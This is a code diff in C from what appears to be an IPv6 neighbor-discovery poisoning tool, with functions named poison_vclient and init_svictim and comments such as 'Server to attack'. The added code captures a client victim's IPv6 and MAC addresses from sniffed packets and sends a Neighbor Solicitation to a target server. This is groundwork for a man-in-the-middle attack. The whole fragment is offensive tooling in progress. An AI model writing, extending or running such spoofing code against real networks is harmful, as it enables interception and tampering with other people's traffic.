@@ -16,7 +16,7 @@
 #include <disturber.h>
 #include <packets.h>
 #include <device.h>
-
+#include <communication.h>
 
 void debug_cvivtim(struct victim *cli) {
 	char buf[INET6_ADDRSTRLEN];
@@ -44,6 +44,22 @@ int victim_info_complete(struct victim *vic) {
 		return 0;
 
 	return 1;
+}
+
+void populate_cvictim(char *pkt) {
+	struct ethhdr *eth;
+	struct ip6_hdr *ip6;
+
+	eth = (struct ethhdr *)pkt;
+	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
+
+	printf("Populando CVICTIM\n");
+
+	cvictim = (struct victim *)malloc(sizeof(struct victim));
+	memcpy(&(cvictim->ipv6), &(ip6->ip6_src), sizeof(struct in6_addr));
+	memcpy(&(cvictim->hwaddr), &(eth->h_source), ETH_ALEN);
+
+	debug_cvivtim(cvictim);
 }
 
 /*struct victim *get_cvictim(struct ether_addr *hwaddr) {
@@ -111,6 +127,7 @@ void *poison_vclient(void *conn) {
 */
 void init_svictim(const char *sv_address) {
 	char server_victim[INET6_ADDRSTRLEN];
+	char *pkt;
 
 	if (inet_pton(AF_INET6, sv_address, &svictim.ipv6) <= 0) {
 		printf("Error setting victim's address\n");
@@ -120,6 +137,14 @@ void init_svictim(const char *sv_address) {
 	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
 	printf("Server to attack: %s\n", server_victim);
 	printf("Sending Neighbor Solicitation to %s\n", server_victim);
+
+	pkt = alloc_ndsolicit(&svictim.ipv6);
+	send_packet(pkt);
+
+	if (pkt)
+		free(pkt);
+
+
 }
 
 void init_cvictim() {
